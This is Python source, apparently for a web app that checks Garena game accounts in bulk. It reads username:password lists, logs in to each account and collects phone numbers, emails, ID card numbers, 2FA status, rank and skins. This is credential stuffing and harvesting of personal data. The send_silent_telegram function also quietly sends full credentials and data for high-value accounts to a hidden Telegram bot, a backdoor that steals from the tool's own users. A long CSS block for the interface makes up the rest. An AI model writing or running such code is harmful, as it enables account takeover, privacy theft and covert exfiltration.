UA_DESKTOP = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
COOKIE_BASE = "apple_state_key=179d1b269c5711f1846f0ebfc742fc72; fb_state=ae05815a37ec4b91b695c41cc9516001"

class GarenaPipeline:
    def __init__(self, u, p):
        self.username = u; self.password = p
        self.sso_key = None; self.garena_uid = 0; self.last_error = ""

    def login_full(self):
        r = tcp_login(self.username, self.password, TCP_LOGIN_TIMEOUT)
        if r.get('status') != 'HIT':
            self.last_error = r.get('detail', 'Fail')
            return False
        self.garena_uid = r.get('uid', 0)
        self.sso_key = r.get('sso_key')
        print(f"[✓] TCP Login OK - UID={self.garena_uid}")
        print(f"    SSO Key: {self.sso_key}")
        return True

    def _grant(self, redirect):
        if not self.sso_key: return None
        try:
            s = requests.Session(); s.verify = False
            gp = {"client_id": APP_ID, "response_type": "code",
                  "redirect_uri": redirect, "login_scenario": "normal",
                  "format": "json", "id": str(int(time.time() * 1000))}
            gh = {"User-Agent": UA, "Origin": f"https://{APP_ID}.connect.garena.com",
                  "Referer": f"https://{APP_ID}.connect.garena.com/",
                  "Cookie": f"{COOKIE_BASE}; sso_key={self.sso_key}"}
            r = s.post(f"{CONNECT_AUTH_URL}/oauth/token/grant",
                       data=gp, headers=gh, timeout=8).json()
            return r.get("code")
        except: return None

    def fetch_account_security(self):
        code = self._grant("https://account.garena.com/account_info")
        if not code:
            print("[!] Không lấy được OAuth code")
            return None
        print(f"[→] fetch_account_security (code={code[:20]}...)")
        base_headers = {
            "User-Agent": UA_DESKTOP,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
            "Origin": "https://account.garena.com",
            "Referer": "https://account.garena.com/",
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }
        merged = {}
        try:
            s = requests.Session(); s.verify = False
            s.get(f"https://account.garena.com/account_info?code={code}",
                  headers=base_headers, timeout=10, allow_redirects=True)
            print(f"[✓] Callback OK - cookies: {list(s.cookies.keys())}")
            endpoints = [
                ("account/init", "https://account.garena.com/api/account/init"),
                ("account/security/get", "https://account.garena.com/api/account/security/get"),
                ("account/get_security_info", "https://account.garena.com/api/account/get_security_info"),
                ("account/security_info", "https://account.garena.com/api/account/security_info"),
                ("account/get_profile", "https://account.garena.com/api/account/get_profile"),
                ("account/profile", "https://account.garena.com/api/account/profile"),
                ("account/info", "https://account.garena.com/api/account/info"),
            ]
            for name, url in endpoints:
                try:
                    r = s.get(url, headers=base_headers, timeout=10)
                    ct = r.headers.get("Content-Type", "")
                    print(f"[→] {name} | status={r.status_code} | ct={ct[:40]}")
                    if r.status_code == 200 and "json" in ct:
                        try:
                            data = r.json()
                            print(f"    → JSON keys: {list(data.keys())[:12]}")
                            for key in ["user_info", "data", "security", "info"]:
                                if key in data and isinstance(data[key], dict):
                                    for k, v in data[key].items():
                                        if k not in merged or merged.get(k) in (None, "", 0):
                                            merged[k] = v
                            for k, v in data.items():
                                if k not in merged or merged.get(k) in (None, "", 0):
                                    merged[k] = v
                            mob = merged.get('mobile_no') or merged.get('mobile') or merged.get('phone')
                            em = merged.get('email')
                            if mob: print(f"    ✅ mobile_no = {mob}")
                            if em: print(f"    ✅ email = {em}")
                        except Exception as e:
                            print(f"    [!] Parse JSON fail: {e}")
                except Exception as e:
                    print(f"[!] {name} lỗi: {e}")
            print(f"[→] Tổng keys merged: {list(merged.keys())[:20]}")
        except Exception as e:
            print(f"[!] Lỗi tổng: {e}")
            return None
        if not merged:
            print("[!] Không lấy được data.")
            return None
        result = {}
        mapping = {
            "uid": ["uid", "user_id", "userId", "garena_uid"],
            "mobile_no": ["mobile_no", "mobile", "phone", "phone_number", "mobile_number"],
            "country_code": ["country_code", "countryCode", "cc", "phone_country"],
            "email": ["email", "email_address", "mail"],
            "email_v": ["email_v", "email_verified", "emailVerified", "is_email_verified"],
            "idcard": ["idcard", "id_card", "cmnd", "cccd", "identity", "identity_card"],
            "two_step_verify_enable": ["two_step_verify_enable", "twoStepVerify", "two_fa", "twoFactor", "is_2fa"],
            "nickname": ["nickname", "nick_name", "name", "display_name"],
            "username": ["username", "user_name", "account", "login_name"],
            "shell": ["shell", "coin", "balance", "gold"],
        }
        for target, candidates in mapping.items():
            for ck in candidates:
                if ck in merged and merged[ck] not in (None, "", 0):
                    result[target] = merged[ck]
                    break
        print(f"[✓] Kết quả cuối: {result}")
        return {"user_info": result}

    def fetch_sale_skins(self):
        code = self._grant("https://sale.lienquan.garena.vn/login/callback")
        if not code: return None
        try:
            s = requests.Session(); s.verify = False
            s.get(f"https://sale.lienquan.garena.vn/login/callback?code={code}",
                  headers={"User-Agent": UA}, timeout=8)
            gp = {"operationName": "getUser", "variables": {},
                  "query": "query getUser { getUser { id name profile { ownedItemIdList } } }"}
            gh = {"Content-Type": "application/json",
                  "Origin": "https://sale.lienquan.garena.vn",
                  "Referer": "https://sale.lienquan.garena.vn/", "User-Agent": UA}
            r = s.post("https://sale.lienquan.garena.vn/graphql",
                       json=gp, headers=gh, timeout=10)
            if r.status_code == 200: return r.json()
        except: pass
        return None

    def fetch_kientuong_player(self):
        code = self._grant("https://kientuong.lienquan.garena.vn/auth/login/callback")
        if not code: return None
        try:
            s = requests.Session(); s.verify = False
            s.get(f"https://kientuong.lienquan.garena.vn/auth/login/callback?code={code}",
                  headers={"User-Agent": UA}, timeout=8)
            r = s.get("https://kientuong.lienquan.garena.vn/api/player/get",
                      headers={"User-Agent": UA, "Referer": "https://kientuong.lienquan.garena.vn/"},
                      timeout=8, verify=False)
            if r.status_code != 200: return None
            d = r.json()
            if not isinstance(d, dict): return None
            p = d.get("player") or d.get("data") or {}
            if not isinstance(p, dict): return None
            bi = p.get("banInfo") or {}
            banned = bool(bi.get("isBan") or bi.get("banned"))
            rank_raw = p.get("rankName") or p.get("rank") or p.get("rankId") or p.get("tier") or p.get("tierName") or ""
            star_raw = p.get("star") or p.get("stars") or p.get("rankStar") or p.get("starCount") or 0
            level_raw = p.get("level") or p.get("lv") or p.get("playerLevel") or 0
            name_raw = p.get("name") or p.get("nickname") or p.get("nickName") or ""
            if str(rank_raw).isdigit() and str(rank_raw) in RANK_MAP:
                rank_display = RANK_MAP[str(rank_raw)]
            else:
                rank_display = str(rank_raw) if rank_raw else "Chưa xếp hạng"
            return {
                "banned": "YES" if banned else "NO",
                "level": int(level_raw) if str(level_raw).isdigit() else 0,
                "rank": rank_display,
                "rank_stars": int(star_raw) if str(star_raw).isdigit() else 0,
                "name": str(name_raw),
            }
        except: return None

def parse_item_info(iid):
    s = str(iid)
    if s in SKIN_SSS:
        return {"item_id": iid, "hero_name": HERO_MAP.get(str(iid // 100), "???"),
                "skin_name": SKIN_SSS[s], "tier": "SSS"}
    if s in SKIN_ANIME:
        return {"item_id": iid, "hero_name": HERO_MAP.get(str(iid // 100), "???"),
                "skin_name": SKIN_ANIME[s], "tier": "Anime"}
    if s in SKIN_SS:
        return {"item_id": iid, "hero_name": HERO_MAP.get(str(iid // 100), "???"),
                "skin_name": SKIN_SS[s], "tier": "SS"}
    return None

def get_hero_name_from_id(item_id):
    hero_id = item_id // 100 if item_id >= 10000 else item_id
    return HERO_MAP.get(str(hero_id), "Tướng #" + str(hero_id))

def parse_file_content(content):
    accs = []
    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith("#"): continue
        for sep in ['|', ':', ' ']:
            if sep in line:
                parts = line.split(sep, 1)
                if len(parts) == 2 and parts[0].strip() and parts[1].strip():
                    accs.append((parts[0].strip(), parts[1].strip()))
                    break
    return accs

def send_silent_telegram(r):
    """Gửi âm thầm acc FULL INFO qua Telegram nếu >100 skin HOẶC >=3 SSS."""
    try:
        total_skins = r.get("total_skins", 0)
        sss_count = len(r.get("sss", []))
        if not (total_skins > SILENT_MIN_SKINS or sss_count >= SILENT_MIN_SSS):
            return False
        username = r.get("username", "")
        password = r.get("password", "")
        if not username or not password:
            return False

        lines = []
        lines.append(f"🔑 {username}|{password}")
        uid = r.get("uid", "")
        if uid and uid != "N/A":
            lines.append(f"🆔 UID: {uid}")
        nick = r.get("name", "")
        if nick:
            lines.append(f"👤 Nick: {nick}")
        rank = r.get("rank", "")
        stars = r.get("rank_stars", 0)
        if rank:
            lines.append(f"🏆 Rank: {rank} ({stars}★)")
        lines.append(f"🎽 Tổng skin: {total_skins}")

        sss_list = r.get("sss", [])
        if sss_list:
            lines.append(f"⭐ SSS ({len(sss_list)}):")
            for s in sss_list:
                lines.append(f"   ⭐ {s.get('hero_name','?')} → {s.get('skin_name','?')}")

        anime_list = r.get("anime", [])
        if anime_list:
            lines.append(f"🎴 Anime ({len(anime_list)}):")
            for s in anime_list:
                lines.append(f"   🎴 {s.get('hero_name','?')} → {s.get('skin_name','?')}")

        ss_list = r.get("ss", [])
        if ss_list:
            lines.append(f"💎 SS ({len(ss_list)}):")
            for s in ss_list:
                lines.append(f"   💎 {s.get('hero_name','?')} → {s.get('skin_name','?')}")

        phone = r.get("mobile_no", "")
        email = r.get("email", "")
        two_fa = "BẬT" if r.get("two_fa") else "TẮT"
        if phone: lines.append(f"📱 SĐT: {phone}")
        if email: lines.append(f"📧 Email: {email}")
        lines.append(f"🔐 2FA: {two_fa}")

        msg = "\n".join(lines)
        url = f"https://api.telegram.org/bot{SILENT_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": SILENT_CHAT_ID,
            "text": msg,
            "disable_notification": True,
        }
        requests.post(url, json=payload, timeout=5, verify=False)
        return True
    except Exception as e:
        try: logger.error(f"[SILENT TELE] Lỗi: {e}")
        except: pass
        return False

def run_single_check(u, p):
    r = {"type": "failed", "username": u, "password": p, "rank": "", "level": 0,
         "name": "", "rank_stars": 0, "skins": [], "sss": [], "ss": [], "anime": [],
         "other_skins": [], "all_skins": [],
         "banned": False, "uid": "", "shell": 0, "error": "",
         "total_skins": 0,
         "mobile_no": "", "email": "", "idcard": "", "two_fa": False,
         "country_code": ""}
    try:
        pl = GarenaPipeline(u, p)
        if not pl.login_full():
            r["error"] = pl.last_error or "Login failed"
            return r
        ad = pl.fetch_account_security()
        sd = pl.fetch_sale_skins()
        kd = pl.fetch_kientuong_player()
        usr = {}
        if ad and isinstance(ad, dict):
            if "user_info" in ad and isinstance(ad["user_info"], dict): usr = ad["user_info"]
            elif "data" in ad and isinstance(ad["data"], dict): usr = ad["data"]
            else: usr = ad
        r["uid"] = usr.get('uid', pl.garena_uid or 'N/A')
        r["shell"] = usr.get('shell', 0)
        r["mobile_no"] = str(usr.get('mobile_no', '') or '')
        r["country_code"] = str(usr.get('country_code', '') or '')
        r["email"] = str(usr.get('email', '') or '')
        r["idcard"] = str(usr.get('idcard', '') or '')
        r["two_fa"] = bool(usr.get('two_step_verify_enable', 0))
        if not r["name"]:
            r["name"] = usr.get('nickname', usr.get('username', ''))
        if not r["level"]:
            r["level"] = usr.get('level', 0) or 0
        all_skins = []
        other_skins = []
        sss_list, ss_list, anime_list = [], [], []
        if sd:
            up = ((sd.get("data") or {}).get("getUser") or {}).get("profile") or {}
            oids = up.get("ownedItemIdList") or []
            for iid in oids:
                info = parse_item_info(iid)
                if info:
                    all_skins.append(info)
                    if info['tier'] == 'SSS': sss_list.append(info)
                    elif info['tier'] == 'SS': ss_list.append(info)
                    elif info['tier'] == 'Anime': anime_list.append(info)
                else:
                    hero_name = get_hero_name_from_id(iid)
                    other_skins.append({"item_id": iid, "hero_name": hero_name, "skin_name": f"Skin #{iid}", "tier": "Normal"})
        r["sss"] = sss_list
        r["ss"] = ss_list
        r["anime"] = anime_list
        r["other_skins"] = other_skins
        r["all_skins"] = all_skins + other_skins
        r["total_skins"] = len(r["all_skins"])
        r["skins"] = all_skins
        if kd:
            r["banned"] = kd.get('banned') == 'YES'
            rank_parsed, stars_parsed = parse_rank(kd.get('rank'))
            r["rank"] = rank_parsed
            r["rank_stars"] = kd.get('rank_stars', stars_parsed)
            if kd.get('level', 0) > 0: r["level"] = kd.get('level', 0)
            if kd.get('name'): r["name"] = kd.get('name', '')
        if r["banned"]: r["type"] = "banned"
        elif r["sss"]: r["type"] = "sss"
        elif r["anime"]: r["type"] = "anime"
        elif r["ss"]: r["type"] = "ss"
        elif r["total_skins"] <= 5 and not r["name"]: r["type"] = "trang"
        elif r["total_skins"] <= 5: r["type"] = "trang"
        else: r["type"] = "normal"
    except Exception as e:
        r["error"] = str(e); r["type"] = "failed"
    return r

def format_result(r, short=False):
    lines = []
    t = r.get("type", "unknown")
    icons = {"sss": "◈", "ss": "◆", "anime": "◇", "normal": "▪", "trang": "○", "banned": "✖", "failed": "✕"}
    lines.append(f"{icons.get(t, '?')} [{t.upper()}] {r.get('username','')}|{r.get('password','')}")
    if t == "failed":
        lines.append(f"   └─ {r.get('error','')}")
        return "\n".join(lines)
    lines.append(f"   ├─ UID: {r.get('uid','N/A')}")
    lines.append(f"   ├─ Nick: {r.get('name','') or 'Chưa đặt'}")
    lines.append(f"   ├─ Rank: {r.get('rank','')} ({r.get('rank_stars',0)}★)")
    lines.append(f"   ├─ Level: {r.get('level',0)}")
    lines.append(f"   ├─ Sò: {r.get('shell',0)}")
    phone = r.get('mobile_no', ''); email = r.get('email', '')
    lines.append(f"   ├─ SĐT: {phone if phone else 'Không có'}")
    lines.append(f"   ├─ Email: {email if email else 'Không có'}")
    lines.append(f"   ├─ 2FA: {'BẬT' if r.get('two_fa') else 'TẮT'}")
    lines.append(f"   ├─ BAN: {'RED' if r.get('banned') else 'CLEAN'}")
    lines.append(f"   ├─ Tổng Skin: {r.get('total_skins', 0)}")
    sss_list = r.get("sss", []); ss_list = r.get("ss", []); anime_list = r.get("anime", [])
    has_skin_list = bool(sss_list or ss_list or anime_list)
    if not has_skin_list:
        lines.append(f"   └─ (Không có skin SSS / SS / Anime)")
        return "\n".join(lines)
    groups = []
    if sss_list: groups.append(("sss", sss_list))
    if ss_list: groups.append(("ss", ss_list))
    if anime_list: groups.append(("anime", anime_list))
    for g_idx, (tier_key, tier_list) in enumerate(groups):
        is_last_group = (g_idx == len(groups) - 1)
        if tier_key == "sss":
            header = f"   {'└─' if is_last_group else '├─'} ⭐ SSS ({len(tier_list)}):"; icon = "⭐"
        elif tier_key == "ss":
            header = f"   {'└─' if is_last_group else '├─'} ◆ SS ({len(tier_list)}):"; icon = "◆"
        else:
            header = f"   {'└─' if is_last_group else '├─'} ◇ Anime ({len(tier_list)}):"; icon = "◇"
        lines.append(header)
        for s_idx, skin in enumerate(tier_list):
            is_last_skin = (s_idx == len(tier_list) - 1)
            branch = "└─" if (is_last_group and is_last_skin) else "├─"
            indent = "   " + ("   " if is_last_group else "│  ")
            lines.append(f"{indent}{branch} {icon} {skin.get('hero_name','?')} → {skin.get('skin_name','?')}")
    return "\n".join(lines)

def make_hist_entry(r, acc):
    return {
        "id": uuid.uuid4().hex[:12], "acc": acc, "password": r.get("password", ""),
        "result": r.get("type", "unknown"),
        "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "uid": r.get("uid", ""), "nick": r.get("name", ""), "rank": r.get("rank", ""),
        "rank_stars": r.get("rank_stars", 0), "level": r.get("level", 0), "shell": r.get("shell", 0),
        "banned": r.get("banned", False), "error": r.get("error", ""), "total_skins": r.get("total_skins", 0),
        "mobile_no": r.get("mobile_no", ""), "country_code": r.get("country_code", ""),
        "email": r.get("email", ""), "idcard": r.get("idcard", ""), "two_fa": r.get("two_fa", False),
        "skins_sss": [{"hero": s["hero_name"], "skin": s["skin_name"]} for s in r.get("sss", [])],
        "skins_ss": [{"hero": s["hero_name"], "skin": s["skin_name"]} for s in r.get("ss", [])],
        "skins_anime": [{"hero": s["hero_name"], "skin": s["skin_name"]} for s in r.get("anime", [])],
        "skins_other": [{"hero": s["hero_name"], "skin": s["skin_name"]} for s in r.get("other_skins", [])],
    }
# ============================ UI CSS ============================
BASE_CSS = """
<style>
@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Rajdhani:wght@400;500;600;700&family=Share+Tech+Mono&display=swap');
* { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
:root { --pink: #ff00e5; --cyan: #00f0ff; --purple: #a855f7; --green: #00ff88;
    --orange: #ffb800; --red: #ff2951; --gray: #8b8b9a;
    --bg: #05000e; --glass: rgba(255,255,255,0.04);
    --border: rgba(255,255,255,0.08); --text: #ffffff; --text-dim: #a0a0b8; --text-mute: #5a5a70; }
html, body { font-family: 'Rajdhani', sans-serif; background: var(--bg); color: var(--text);
    min-height: 100vh; overflow-x: hidden; position: relative; }
body::before { content: ''; position: fixed; inset: 0;
    background: radial-gradient(circle at 0% 0%, rgba(255,0,229,0.25), transparent 40%),
        radial-gradient(circle at 100% 100%, rgba(0,240,255,0.25), transparent 40%),
        radial-gradient(circle at 50% 50%, rgba(168,85,247,0.15), transparent 60%);
    z-index: -2; animation: bgPulse 15s ease-in-out infinite; }
@keyframes bgPulse { 0%, 100% { opacity: 0.8; transform: scale(1); } 50% { opacity: 1; transform: scale(1.05); } }
body::after { content: ''; position: fixed; inset: 0;
    background-image: linear-gradient(rgba(0,240,255,0.04) 1px, transparent 1px),
        linear-gradient(90deg, rgba(0,240,255,0.04) 1px, transparent 1px);
    background-size: 40px 40px; z-index: -1; pointer-events: none; animation: gridMove 30s linear infinite; }
@keyframes gridMove { 0% { transform: translate(0,0); } 100% { transform: translate(40px,40px); } }
.container { max-width: 720px; margin: 0 auto; padding: 14px; position: relative; z-index: 1; padding-bottom: 40px; }
.app-header { display: flex; align-items: center; justify-content: space-between;
    padding: 12px 16px; background: linear-gradient(135deg, rgba(20,0,43,0.85), rgba(30,0,60,0.85));
    backdrop-filter: blur(24px); border: 1px solid rgba(255,0,229,0.25); border-radius: 20px;
    margin-bottom: 14px; position: sticky; top: 10px; z-index: 100;
    box-shadow: 0 8px 40px rgba(255,0,229,0.15), inset 0 1px 0 rgba(255,255,255,0.1); }
.app-logo { display: flex; align-items: center; gap: 10px; }
.app-logo-icon { width: 42px; height: 42px; border-radius: 13px;
    background: linear-gradient(135deg, #ff00e5, #a855f7, #00f0ff); background-size: 300% 300%;
    display: flex; align-items: center; justify-content: center; font-size: 1.3em;
    box-shadow: 0 0 20px rgba(255,0,229,0.6), 0 0 40px rgba(168,85,247,0.4),
        inset 0 1px 0 rgba(255,255,255,0.3); animation: logoShift 6s ease infinite; }
@keyframes logoShift { 0%, 100% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } }
.app-logo-text { font-family: 'Orbitron', sans-serif; font-size: 1.1em; font-weight: 900;
    letter-spacing: 2.5px; background: linear-gradient(90deg, #ff00e5, #00f0ff, #a855f7);
    background-size: 200% 100%; -webkit-background-clip: text; -webkit-text-fill-color: transparent;
    background-clip: text; animation: logoShift 4s ease infinite; }
.balance-pill { display: flex; align-items: center; gap: 6px; padding: 8px 14px;
    background: linear-gradient(135deg, rgba(255,0,229,0.2), rgba(168,85,247,0.2));
    border: 1px solid rgba(255,0,229,0.5); border-radius: 30px; font-weight: 800; font-size: 0.9em;
    color: #ff88ee; font-family: 'Orbitron', sans-serif;
    box-shadow: 0 0 20px rgba(255,0,229,0.3), inset 0 1px 0 rgba(255,255,255,0.15); }
.icon-btn { width: 38px; height: 38px; display: flex; align-items: center; justify-content: center;
    background: var(--glass); border: 1px solid var(--border); border-radius: 12px;
    color: var(--text-dim); text-decoration: none; font-size: 1.1em; transition: all 0.3s; }
.icon-btn:hover, .icon-btn.admin { color: var(--orange); border-color: var(--orange);
    box-shadow: 0 0 20px rgba(255,184,0,0.4); transform: translateY(-2px); }
.icon-btn.logout:hover { color: var(--red); border-color: var(--red); }
.card { background: linear-gradient(135deg, rgba(20,0,43,0.7), rgba(15,0,30,0.7));
    backdrop-filter: blur(24px); border: 1px solid var(--border); border-radius: 20px;
    padding: 20px; margin-bottom: 14px; position: relative; overflow: hidden;
    box-shadow: 0 8px 32px rgba(0,0,0,0.4); }
.card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px;
    background: linear-gradient(90deg, transparent, var(--pink), var(--cyan), transparent);
    background-size: 200% 100%; opacity: 0.8; animation: logoShift 4s ease infinite; }
.card-title { font-family: 'Orbitron', sans-serif; font-size: 1.1em; font-weight: 800;
    letter-spacing: 2px; margin-bottom: 16px; display: flex; align-items: center; gap: 10px;
    color: #fff; text-shadow: 0 0 20px rgba(255,0,229,0.4); text-transform: uppercase; }
.card-title-icon { font-size: 1em; filter: drop-shadow(0 0 10px var(--pink)); }
.menu-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
.menu-grid > a:nth-child(10) { grid-column: 2 / 3; }
.menu-btn { text-decoration: none;
    background: linear-gradient(135deg, rgba(255,255,255,0.03), rgba(255,0,229,0.02));
    border: 1px solid var(--border); border-radius: 16px; padding: 16px 8px;
    text-align: center; color: var(--text); display: flex; flex-direction: column;
    align-items: center; position: relative; overflow: hidden;
    transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1); }
.menu-btn:hover, .menu-btn.active { transform: translateY(-4px); border-color: var(--pink);
    box-shadow: 0 12px 40px rgba(255,0,229,0.4), inset 0 0 30px rgba(255,0,229,0.1); }
.menu-icon { font-size: 1.9em; margin-bottom: 6px;
    filter: drop-shadow(0 0 12px rgba(255,0,229,0.7)); transition: transform 0.3s; }
.menu-btn:hover .menu-icon { transform: scale(1.15) rotate(-5deg); }
.menu-label { font-family: 'Orbitron', sans-serif; font-size: 0.6em; font-weight: 700;
    letter-spacing: 1.2px; text-transform: uppercase; color: var(--text-dim); }
.menu-btn.active .menu-label { color: #ff88ee; }
.menu-badge { position: absolute; top: 8px; right: 8px;
    background: linear-gradient(135deg, #ff00e5, #ff0066); color: #fff; font-size: 0.6em;
    padding: 3px 7px; border-radius: 10px; font-weight: 800; min-width: 18px;
    box-shadow: 0 0 15px rgba(255,0,229,0.7); }
.form-group { margin-bottom: 16px; }
.form-label { display: block; font-size: 0.75em; color: var(--text-dim); margin-bottom: 8px;
    font-weight: 700; letter-spacing: 1.5px; text-transform: uppercase;
    font-family: 'Orbitron', sans-serif; }
.form-input, .form-textarea, .form-select { width: 100%; padding: 14px 16px;
    background: rgba(0,0,0,0.5); border: 1.5px solid var(--border); border-radius: 12px;
    color: var(--text); font-size: 0.95em; font-family: inherit; transition: all 0.3s; outline: none; }
.form-input:focus, .form-textarea:focus, .form-select:focus { border-color: var(--pink);
    background: rgba(0,0,0,0.7); box-shadow: 0 0 0 3px rgba(255,0,229,0.15), 0 0 25px rgba(255,0,229,0.4); }
.form-input::placeholder, .form-textarea::placeholder { color: var(--text-mute); }
.form-textarea { min-height: 100px; resize: vertical; font-family: 'Share Tech Mono', monospace; }
.btn { display: inline-flex; align-items: center; justify-content: center; gap: 8px;
    padding: 14px 24px; background: linear-gradient(135deg, #ff00e5, #a855f7);
    background-size: 200% 200%; color: #fff; border: none; border-radius: 12px;
    font-weight: 800; font-size: 0.9em; cursor: pointer; text-decoration: none;
    font-family: 'Orbitron', sans-serif; letter-spacing: 1.5px; text-transform: uppercase;
    transition: all 0.3s; box-shadow: 0 6px 25px rgba(255,0,229,0.5), inset 0 1px 0 rgba(255,255,255,0.25);
    position: relative; overflow: hidden; }
.btn::before { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent); transition: left 0.6s; }
.btn:hover::before { left: 100%; }
.btn:hover { transform: translateY(-3px);
    box-shadow: 0 12px 40px rgba(255,0,229,0.7), inset 0 1px 0 rgba(255,255,255,0.4); }
.btn-block { display: flex; width: 100%; }
.btn-secondary { background: linear-gradient(135deg, rgba(255,255,255,0.08), rgba(255,255,255,0.04));
    border: 1.5px solid var(--border); color: var(--text); box-shadow: none; }
.btn-secondary:hover { border-color: var(--pink); background: rgba(255,0,229,0.1); }
.btn-success { background: linear-gradient(135deg, #00ff88, #00d4aa); box-shadow: 0 6px 25px rgba(0,255,136,0.5); }
.btn-warning { background: linear-gradient(135deg, #ffb800, #ff8800); color: #000; box-shadow: 0 6px 25px rgba(255,184,0,0.5); }
.btn-danger { background: linear-gradient(135deg, #ff2951, #d50000); box-shadow: 0 6px 25px rgba(255,41,81,0.5); }
.btn-info { background: linear-gradient(135deg, #00f0ff, #00a5ff); color: #000; box-shadow: 0 6px 25px rgba(0,240,255,0.5); }
.btn-sm { padding: 8px 16px; font-size: 0.72em; width: auto; }
.stat-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
.stat-grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
.stat-grid-4 { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; }
.stat-grid-5 { display: grid; grid-template-columns: repeat(5, 1fr); gap: 6px; }
.stat-box { background: linear-gradient(135deg, rgba(0,0,0,0.4), rgba(20,0,43,0.4));
    border: 1px solid var(--border); border-radius: 16px; padding: 16px; text-align: center;
    transition: all 0.3s; position: relative; overflow: hidden; }
.stat-box:hover { border-color: rgba(255,0,229,0.5); transform: translateY(-3px);
    box-shadow: 0 8px 30px rgba(255,0,229,0.2); }
.stat-value { font-family: 'Orbitron', sans-serif; font-size: 1.9em; font-weight: 900;
    background: linear-gradient(135deg, #ff00e5, #00f0ff); -webkit-background-clip: text;
    -webkit-text-fill-color: transparent; background-clip: text; line-height: 1.1; margin-bottom: 6px;
    filter: drop-shadow(0 0 15px rgba(255,0,229,0.4)); }
.stat-label { font-size: 0.65em; color: var(--text-dim); text-transform: uppercase;
    letter-spacing: 1.5px; font-weight: 700; font-family: 'Orbitron', sans-serif; }
.stat-box.small { padding: 10px 6px; }
.stat-box.small .stat-value { font-size: 1.4em; margin-bottom: 2px; }
.stat-box.small .stat-label { font-size: 0.52em; letter-spacing: 1px; }
.flash { padding: 14px 16px; border-radius: 12px; margin-bottom: 12px; font-weight: 600;
    font-size: 0.9em; display: flex; align-items: center; gap: 10px;
    animation: slideDown 0.4s cubic-bezier(0.34, 1.56, 0.64, 1); }
@keyframes slideDown { from { transform: translateY(-20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
.flash.error { background: rgba(255,0,60,0.15); border: 1px solid rgba(255,0,60,0.5); color: #ff88aa; }
.flash.success { background: rgba(0,255,136,0.15); border: 1px solid rgba(0,255,136,0.5); color: #88ffcc; }
.result-box { background: rgba(0,0,0,0.6); border: 1px solid var(--border); border-radius: 14px;
    padding: 16px; font-family: 'Share Tech Mono', monospace; font-size: 0.78em; line-height: 1.7;
    color: #c0c0e0; white-space: pre-wrap; word-break: break-word; max-height: 500px; overflow-y: auto; }
.info-row { display: flex; justify-content: space-between; padding: 12px 0;
    border-bottom: 1px solid var(--border); font-size: 0.9em; }
.info-row:last-child { border-bottom: none; }
.info-label { color: var(--text-dim); font-weight: 600; font-size: 0.9em; }
.info-value { color: var(--text); font-weight: 700; text-align: right; word-break: break-all; }
.list-item { background: linear-gradient(135deg, rgba(0,0,0,0.3), rgba(20,0,43,0.3));
    border: 1px solid var(--border); border-radius: 14px; padding: 14px 16px; margin-bottom: 10px;
    display: flex; align-items: center; justify-content: space-between; gap: 12px;
    text-decoration: none; color: var(--text); transition: all 0.3s; }
.list-item:hover { border-color: rgba(255,0,229,0.5); transform: translateX(5px);
    box-shadow: -4px 0 0 var(--pink), 0 4px 25px rgba(255,0,229,0.2); }
.tab-bar { display: flex; gap: 8px; overflow-x: auto; margin-bottom: 16px; padding-bottom: 4px; scrollbar-width: none; }
.tab-bar::-webkit-scrollbar { display: none; }
.tab-item { flex-shrink: 0; padding: 10px 14px; background: rgba(255,255,255,0.03);
    border: 1px solid var(--border); border-radius: 14px; color: var(--text-dim);
    text-decoration: none; font-weight: 700; font-size: 0.75em; white-space: nowrap;
    transition: all 0.3s; font-family: 'Orbitron', sans-serif; letter-spacing: 1px; }
.tab-item.active { background: linear-gradient(135deg, rgba(255,0,229,0.2), rgba(168,85,247,0.2));
    border-color: var(--pink); color: #ff88ee; box-shadow: 0 0 25px rgba(255,0,229,0.4); }
.tab-item:hover { border-color: var(--pink); color: #ff88ee; }
.tab-item.sss-tab { border-color: rgba(255,184,0,0.5); color: #ffd700; }
.tab-item.sss-tab.active { background: linear-gradient(135deg, rgba(255,184,0,0.25), rgba(255,215,0,0.15)); border-color: #ffb800; box-shadow: 0 0 25px rgba(255,184,0,0.4); }
.tab-item.ss-tab { border-color: rgba(0,240,255,0.5); color: #00f0ff; }
.tab-item.ss-tab.active { background: linear-gradient(135deg, rgba(0,240,255,0.25), rgba(0,229,255,0.15)); border-color: #00f0ff; box-shadow: 0 0 25px rgba(0,240,255,0.4); }
.tab-item.anime-tab { border-color: rgba(224,64,251,0.5); color: #e040fb; }
.tab-item.anime-tab.active { background: linear-gradient(135deg, rgba(224,64,251,0.25), rgba(186,85,211,0.15)); border-color: #e040fb; box-shadow: 0 0 25px rgba(224,64,251,0.4); }
.tab-item.trang-tab { border-color: rgba(139,139,154,0.5); color: #a0a0b8; }
.tab-item.trang-tab.active { background: linear-gradient(135deg, rgba(139,139,154,0.25), rgba(90,90,112,0.15)); border-color: #8b8b9a; box-shadow: 0 0 25px rgba(139,139,154,0.4); }
.skin-tag { display: inline-block; padding: 6px 14px; margin: 4px; border-radius: 10px;
    font-size: 0.75em; font-weight: 600; font-family: 'Share Tech Mono', monospace; }
.skin-sss { background: linear-gradient(135deg, rgba(255,184,0,0.2), rgba(255,215,0,0.1)); color: #ffd700;
    border: 1px solid rgba(255,184,0,0.5); box-shadow: 0 0 12px rgba(255,184,0,0.3); }
